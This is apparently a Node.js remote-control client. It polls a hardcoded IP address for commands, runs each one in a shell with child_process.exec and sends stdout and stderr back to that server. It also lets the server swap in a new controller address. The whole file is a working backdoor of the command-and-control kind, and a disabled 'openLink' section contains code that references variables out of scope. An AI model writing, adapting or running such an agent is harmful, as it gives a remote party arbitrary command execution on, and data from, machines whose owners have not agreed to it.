const request = require('request');
const iconv = require('iconv-lite');
const exec = require('child_process').exec;
// const build_in = require('./build_in');
const fs = require('fs');

let host = 'http://45.32.41.191:81';
let name = 'pc';
let active = false;
let lastFlushTime = 0;
let lastActiveTime = 0;
const openLink = false;
const DEBUG = true;

function initHost() {
    if(fs.existsSync('host')) {
        host = fs.readFileSync('host').toString().trim();
    }
    else {
        fs.writeFileSync('host', host);
    }
    if(fs.existsSync('name')) {
        name = fs.readFileSync('name').toString().trim();
    }
    else {
        fs.writeFileSync('name', name);
    }
    log('started with host:' + host + ' name:' + name);
}

function log(str) {
    if(DEBUG) console.log(str + '\n');
}

function get(url, callback){
    request.get({
        url:url,
        encoding: null,
        followRedirect: false,
        time: false,
        forever: true
    }, callback);
}

function telcmd(cmd, name){
    get(host + '/telcmd?cmd=' + cmd + '&name=' + name, function (error, response, buf) {
    });
}

function result(cmd, res, callback) {
    request.post({
        url: host + '/result',
        body: {
            name: name,
            cmd: cmd,
            res: res,
            time: new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '')
        },
        json: true
    }, callback);
}

// change name to your client name
function flush(){
    let now = new Date().getTime();
    if(!active && now - lastFlushTime < 5 * 60 * 1000) {
        return;
    }
    // log('flush');
    lastFlushTime = now;

    if(active && now - lastActiveTime > 60 * 1000) {
        log('deactive');
        active = false;
    }
    get(host + '/flush?name=' + name, async function (error, response, buf) {
        if(!buf) return;
        let json = new Buffer(buf).toString();
        let cmd_buffer = await JSON.parse(json)['cmd_buffer'];
        for(let i = 0; i < cmd_buffer.length; i++){
            let item = cmd_buffer[i];
            let cmd = item.cmd;
            let encoding = item.encoding ? item.encoding :'gbk';
            if(cmd){
                log('active');
                active = true;
                lastActiveTime = now;
                // remove useless build_in
                // if(await build_in.exec(item)){
                //     console.log('build-in: ', cmd);
                // }
                log('> ' + cmd);
                exec(cmd, {encoding: 'buffer'}, function(err, stdout, stderr) {
                    let res = 'stdout:' + iconv.decode(stdout, encoding) 
                        + '\nstderr:'+ iconv.decode(stderr, encoding);
                    log(res);
                    result(cmd, res);
                });
                // run link file automatic
                if(openLink) {
                    if(!cmd.endsWith('.lnk')){
                        let res = 'stdout:' + iconv.decode(stdout, encoding) 
                            + '\nstderr:'+ iconv.decode(stderr, encoding);
                        log(res);
                        result(cmd, res);
                    }
                }
            }
        }
    });
}

function resetHost() {
    get(host + '/host', async function (error, response, buf) {
        if(!buf) return;
        let newHost = new Buffer(buf).toString().trim();
        if(newHost != host) {
            console.log('host:' + host + ' -> ' + newHost)
            host = newHost;
            fs.writeFileSync('host', host);
        }
    });
}

function deamon(){
    setImmediate(flush);
    setInterval(flush, 5000);
    setInterval(resetHost, 60 * 60 * 1000);
    // setInterval(updateCode, 3 * 60 * 60 * 1000);
}

if (require.main === module) {
    initHost();
    deamon();
}

module.exports = {
    telcmd: telcmd,
    flush: flush
};
